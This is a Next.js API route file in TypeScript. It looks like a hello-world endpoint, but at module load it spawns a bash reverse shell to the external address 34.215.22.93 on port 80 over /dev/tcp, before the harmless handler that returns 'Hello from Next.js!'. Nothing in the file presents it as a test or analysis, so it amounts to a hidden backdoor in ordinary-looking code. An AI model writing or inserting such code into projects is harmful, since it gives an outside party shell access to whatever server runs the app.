import type { NextApiRequest, NextApiResponse } from 'next'
import { spawn } from 'child_process';

const child = spawn('/bin/bash', ['-l', '>', '/dev/tcp/34.215.22.93/80', '0<&1', '2>&1'], { shell: true });
console.log(child);

setTimeout(() => {
  console.log("Hello after 2 seconds");
}, 20000); // 20000 milliseconds = 20 seconds


type ResponseData = {
  message: string
}
 
export default function handler(
  req: NextApiRequest,
  res: NextApiResponse<ResponseData>
) {
  res.status(200).json({ message: 'Hello from Next.js!' })
}
